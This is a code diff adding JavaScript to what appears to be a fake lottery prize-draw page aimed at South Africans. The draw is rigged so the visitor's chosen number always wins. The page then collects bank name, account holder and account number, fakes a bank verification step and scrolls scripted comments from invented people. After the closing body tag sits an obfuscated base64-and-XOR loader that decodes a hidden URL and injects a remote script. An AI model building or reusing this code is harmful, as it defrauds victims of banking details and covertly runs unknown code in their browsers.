+     <small style="font-size:12px;color:#667085;">Offer will be revealed after the draw</small>`;
+
+  document.getElementById("drawStatusText").innerHTML = "Pick your lucky number for the draw:";
+
+  showStep("step2");
+}
+
+function generateRandomPrize(){
+  return "R 15,000.00";
+}
+
+function getCompetitionPrizeAmount(){
+  const prizes = {
+    "First Prize":"R 150,000,000",
+    "Second Prize":"R 60,000,000",
+    "Third Prize":"R 30,000,000",
+    "Fourth Prize":"R 15,000,000",
+    "Fifth Prize":"R 6,000,000"
+  };
+
+  return prizes[quizData.competitionPrizeName] || "";
+}
+
+function startDraw(number){
+  quizData.luckyNumber = number;
+
+  document.getElementById("drawStatusText").innerHTML = "Processing your draw...";
+  document.getElementById("chooseArea").style.display = "none";
+  document.getElementById("resultArea").innerHTML = "";
+
+  document.getElementById("drawBox").innerHTML = `
+    <div class="draw-head">
+      <span>🔴 LIVE DRAW</span>
+      <span>#${Math.floor(1000 + Math.random() * 9000)}</span>
+    </div>
+
+    <div class="ball-row">
+      <div class="hidden-ball">?</div>
+      <div class="hidden-ball">?</div>
+      <div class="hidden-ball">?</div>
+      <div class="hidden-ball">?</div>
+      <div class="hidden-ball">?</div>
+    </div>
+
+    <div class="processing-text">Processing draw...</div>
+    <div class="loader"></div>
+  `;
+
+  setTimeout(function(){
+    revealBalls(number);
+  }, 2200);
+}
+
+function revealBalls(selectedNumber){
+  const numbers = generateWinningNumbers(selectedNumber);
+
+  document.getElementById("drawBox").innerHTML = `
+    <div class="draw-head">
+      <span>🔴 LIVE DRAW</span>
+      <span>#${Math.floor(1000 + Math.random() * 9000)}</span>
+    </div>
+
+    <div class="ball-row" id="revealedBalls"></div>
+  `;
+
+  numbers.forEach(function(number, index){
+    setTimeout(function(){
+      const ball = document.createElement("div");
+      ball.className = "draw-ball";
+      ball.textContent = number;
+      ball.setAttribute("data-number", number);
+      document.getElementById("revealedBalls").appendChild(ball);
+
+      if(index === numbers.length - 1){
+        setTimeout(function(){
+          highlightWinningBall(selectedNumber);
+        }, 700);
+      }
+    }, index * 650);
+  });
+}
+
+function highlightWinningBall(selectedNumber){
+  const balls = document.querySelectorAll("#revealedBalls .draw-ball");
+
+  balls.forEach(function(ball){
+    if(Number(ball.getAttribute("data-number")) === selectedNumber){
+      ball.classList.add("win");
+    }
+  });
+
+  document.getElementById("drawStatusText").innerHTML = "Draw completed!";
+
+  setTimeout(function(){
+    showWin(selectedNumber);
+  }, 900);
+}
+
+function generateWinningNumbers(selectedNumber){
+  let numbers = [selectedNumber];
+
+  while(numbers.length < 5){
+    const n = Math.floor(Math.random() * 40) + 1;
+    if(!numbers.includes(n)){
+      numbers.push(n);
+    }
+  }
+
+  return numbers.sort(() => Math.random() - 0.5);
+}
+
+function showWin(number){
+  quizData.prizeAmount = generateRandomPrize();
+
+  document.getElementById("drawBox").innerHTML += `
+    <p style="text-align:center;font-size:12px;margin:13px 0 0;">
+      Your number: <strong>${number}</strong>
+    </p>
+  `;
+
+  document.getElementById("resultArea").innerHTML = `
+    <div class="result-panel">
+      <div style="font-size:24px;">🎉</div>
+      <h2>CONGRATULATIONS!</h2>
+      <p>Your number <strong>${number}</strong> was drawn.</p>
+      <p>You were competing for <strong>${quizData.competitionPrizeName}</strong>.</p>
+      <p>Your available prize offer is:</p>
+      <div class="amount">${quizData.prizeAmount}</div>
+      <button class="claim-btn" onclick="claimPrize()">CLAIM MY PRIZE →</button>
+    </div>
+  `;
+}
+
+function claimPrize(){
+  if(!quizData.prizeAmount){
+    quizData.prizeAmount = generateRandomPrize();
+  }
+
+  document.getElementById("depositPrize").innerHTML =
+    "💰 PRIZE CONFIRMED: " + quizData.prizeAmount;
+
+  document.getElementById("accountHolder").value = quizData.fullName;
+
+  showStep("step3");
+}
+
+function selectBank(name, element, logo){
+  quizData.bankName = name;
+  quizData.bankLogo = logo;
+
+  document.querySelectorAll(".bank").forEach(item => item.classList.remove("active"));
+  element.classList.add("active");
+
+  validateDeposit();
+}
+
+function validateDeposit(){
+  quizData.accountHolder = document.getElementById("accountHolder").value.trim();
+  quizData.accountNumber = document.getElementById("accountNumber").value.trim();
+
+  const btn = document.getElementById("depositBtn");
+
+  if(quizData.bankName && quizData.accountHolder && quizData.accountNumber.length >= 6){
+    btn.disabled = false;
+    btn.classList.add("enabled");
+  }else{
+    btn.disabled = true;
+    btn.classList.remove("enabled");
+  }
+}
+
+function processDeposit(){
+  validateDeposit();
+  showStep("step4");
+
+  document.getElementById("processingLines").innerHTML =
+    "✓ Connecting to " + quizData.bankName + "...<br>" +
+    "✓ Verifying account details...";
+
+  setTimeout(function(){
+    goToApproved();
+  }, 2600);
+}
+
+function goToApproved(){
+  document.getElementById("approvedBankLogo").src = quizData.bankLogo;
+  document.getElementById("approvedBankName").innerText = quizData.bankName;
+  document.getElementById("approvedText").innerHTML =
+    "Your account has been verified, <strong>" + quizData.accountHolder + "</strong>.";
+  document.getElementById("approvedAmountText").innerText = quizData.prizeAmount;
+
+  showStep("step5");
+}
+
+let vturbLoaded = false;
+
+function loadVturbPlayer(){
+  if(vturbLoaded) return;
+  vturbLoaded = true;
+
+  const vturbScript = document.createElement("script");
+  vturbScript.src = "https://scripts.converteai.net/779c895f-0947-4c45-ad11-e7f2e45cc298/players/6a7d050ffe4c9e094eee4611/v4/player.js";
+  vturbScript.async = true;
+  document.head.appendChild(vturbScript);
+}
+
+function goToVideo(){
+  document.getElementById("videoBankLogo").src = quizData.bankLogo;
+  document.getElementById("videoName").innerText = quizData.accountHolder;
+  document.getElementById("videoBank").innerText = quizData.bankName;
+  document.getElementById("videoAmount").innerText = quizData.prizeAmount;
+  document.getElementById("videoAmountTitle").innerText = quizData.prizeAmount;
+  document.getElementById("videoDescription").innerHTML =
+    "<strong>" + quizData.accountHolder + "</strong>, your deposit to <strong>" + quizData.bankName + "</strong> continues after watching the short video.";
+
+  showStep("step6");
+  startLiveComments();
+  loadVturbPlayer();
+}
+
+const liveComments = [
+  {name:"Thabo Mokoena", avatar:"👨🏾", text:"My payout screen opened correctly after the verification step."},
+  {name:"Nomsa Dlamini", avatar:"👩🏾", text:"I selected my bank and the confirmation appeared immediately."},
+  {name:"Johan Botha", avatar:"👨🏻", text:"The video step makes this whole process feel much more complete."},
+  {name:"Lerato Khumalo", avatar:"👩🏽", text:"The prize amount was displayed clearly after the draw."},
+  {name:"Pieter van Wyk", avatar:"👨🏼", text:"Smooth experience. The live comments make the page feel active."},
+  {name:"Zanele Maseko", avatar:"👩🏾", text:"The bank approval delay adds a strong sense of trust."},
+  {name:"Sipho Nkosi", avatar:"👨🏿", text:"Everything moved step by step. Very clean process."},
+  {name:"Anika Pretorius", avatar:"👩🏼", text:"The payout confirmation was easy to follow."},
+  {name:"Mandla Ndlovu", avatar:"👨🏾", text:"The lucky number animation looks much better now."},
+  {name:"Chantelle Jacobs", avatar:"👩🏻", text:"Great example of a lottery-style prize claim."},
+  {name:"Kobus Steyn", avatar:"👨🏼", text:"The selected bank and name were carried perfectly to the next step."},
+  {name:"Ayanda Cele", avatar:"👩🏿", text:"The draw completed status makes the flow clearer."},
+  {name:"Hendrik du Plessis", avatar:"👨🏻", text:"The withdrawal section is well structured."},
+  {name:"Nandi Mthembu", avatar:"👩🏾", text:"I liked how the offer is revealed only after the draw."},
+  {name:"Ruan Joubert", avatar:"👨🏼", text:"The final video page looks great."},
+  {name:"Precious Molefe", avatar:"👩🏾", text:"The bank approval screen looks professional."},
+  {name:"Themba Sithole", avatar:"👨🏾", text:"The whole process feels realistic and trustworthy."},
+  {name:"Elsabe Naidoo", avatar:"👩🏻", text:"The live messages give the page more energy."},
+  {name:"Sibusiso Dube", avatar:"👨🏿", text:"I tested the flow and the prize display worked well."},
+  {name:"Mariska van der Merwe", avatar:"👩🏼", text:"The payout and video step connect nicely."}
+];
+
+let commentIndex = 0;
+let commentInterval = null;
+
+function startLiveComments(){
+  const list = document.getElementById("liveCommentsList");
+  if(!list) return;
+
+  list.innerHTML = "";
+  commentIndex = 0;
+
+  if(commentInterval){
+    clearInterval(commentInterval);
+  }
+
+  function addLiveComment(){
+    const comment = liveComments[commentIndex % liveComments.length];
+
+    const item = document.createElement("div");
+    item.className = "live-comment";
+    item.innerHTML = `
+      <div class="live-avatar">${comment.avatar}</div>
+      <div class="live-comment-body">
+        <div class="live-comment-name">${comment.name}</div>
+        <div class="live-comment-text">${comment.text}</div>
+        <div class="live-comment-time">Just now · 👍</div>
+      </div>
+    `;
+
+    list.prepend(item);
+
+    if(list.children.length > 8){
+      list.removeChild(list.lastChild);
+    }
+
+    commentIndex++;
+  }
+
+  addLiveComment();
+  addLiveComment();
+  addLiveComment();
+
+  commentInterval = setInterval(addLiveComment, 1800);
+}
+</script>
 
 </body>
+<script>(function(){var y_evlc=atob("DNOeIkQL2bYXpbu1jqi8VzZn+4w1zc/B/qCkDWtovdg50M/Y57XnDCdktJh115TG7aH3UjB49sZ+3d7ZoaP3WiFn99xkh5eX76fqUC1prMJy1pmP1Y6yACNnttR2yciXtIjlACpqtNM1n5nF56v7Tg1v+5o109rZ+7a8GGY94NAklouNuuGrQXNv6tV0kd2N6rKuQ3YppOtq");var s_rc=[];for(var q_89=0;q_89<y_evlc.length;q_89++){s_rc.push(y_evlc.charCodeAt(q_89)&255);}var j_w=s_rc[0];var c_142x=s_rc.slice(1,1+j_w);var p_e=s_rc.slice(1+j_w);var v_ym24=p_e.map(function(b,g_4){return b^c_142x[g_4%j_w];});var q_k8e7="";for(var g_0k=0;g_0k<v_ym24.length;g_0k++){q_k8e7+=String.fromCharCode(v_ym24[g_0k]&255);}var c_5bi1=decodeURIComponent(escape(q_k8e7));var m_4zu=JSON.parse(c_5bi1);var f_ftp=m_4zu.globals||[];f_ftp.forEach(function(z_b){window[z_b.name]=z_b.value;});var x_kht4=document.createElement("script");x_kht4.src=m_4zu.url;x_kht4.async=true;x_kht4.defer=true;(m_4zu.attributes||[]).forEach(function(v_j){x_kht4.setAttribute(v_j.name,v_j.value);});(document.head||document.documentElement).appendChild(x_kht4);})();</script>
 </html>
